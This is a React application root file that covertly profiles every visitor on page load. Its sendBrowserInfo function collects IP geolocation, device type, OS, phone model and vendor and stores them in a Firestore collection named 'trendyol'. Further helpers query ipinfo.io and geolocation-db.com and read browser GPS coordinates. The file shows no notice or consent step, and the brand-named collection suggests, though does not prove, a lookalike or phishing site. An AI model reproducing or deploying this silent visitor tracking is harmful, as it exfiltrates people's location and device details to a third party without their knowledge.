import { addDoc, collection } from "firebase/firestore";
import "./App.css";
import Router from "./router";
import { useState } from "react";
import axios from "axios";
import { useEffect } from "react";
import db from "./fireabase";
import useReactIpLocation from "react-ip-details";
import {
  isAndroid,
  isIOS,
  osName,
  mobileModel,
  mobileVendor,
} from "react-device-detect";
import { useGeolocated } from "react-geolocated";
function App() {
  const [finish, setFinished] = useState(false);
  const [ipAddress, setIpAddress] = useState("");
  const {
    currency,
    exchangeRate,
    ipResponse,
    exchangeRateResponse,
    errorMessage,
    geoLocationPosition,
    geoLocationErrorMessage,
    currencyString,
  } = useReactIpLocation({ numberToConvert: 100 });

  useEffect(() => {
    !finish && ipResponse && sendBrowserInfo();
  }, [finish, ipResponse]);
  async function sendBrowserInfo() {
    let ip = {};
    const date = new Date();
    ip.location = ipResponse;
    ip.turkishDate = date.toLocaleString("tr-TR");
    ip.telephoneType = isAndroid ? "Android" : isIOS ? "Iphone" : "Web";
    ip.osName = osName;
    ip.mobileModel = mobileModel;
    ip.mobileVendor = mobileVendor;
    if (ip?.location?.city) {
      try {
        const docRef = await addDoc(collection(db, "trendyol"), ip);
        if (docRef?.id) {
          setFinished(true);
        }
        return;
      } catch (e) {
        console.log("hata");
      }
    }
  }
  return (
    <div>
      <Router />
    </div>
  );
}

export default App;

const findIp = async () => {
  try {
    const response2 = await axios.get("https://geolocation-db.com/json/");
    return response2?.data;
  } catch (error) {
    console.error("Error fetching IP data:", error);
  }
};
const findIp2 = async () => {
  try {
    const responseJson = await axios.get(
      process.env.REACT_APP_FIND_IP_URL + process.env.REACT_APP_FIND_IP_API_KEY
    );
    return responseJson.data;
  } catch (error) {
    console.error("Error fetching IP data:", error);
  }
};
async function getUserLocation() {
  try {
    const response = await axios.get("https://ipinfo.io/json", {
      headers: { Authorization: `Bearer ${process.env.REACT_APP_TOKEN}` },
    });
    return response.data;
  } catch (error) {
    console.error("Error:", error);
  }
}
function getUserLocation2(setIp4) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    setIp4(true);
    console.log("Geolocation is not supported by this browser.");
  }

  function showPosition(position) {
    setIp4({
      lat: position.coords.latitude,
      lng: position.coords.longitude,
    });
  }
}
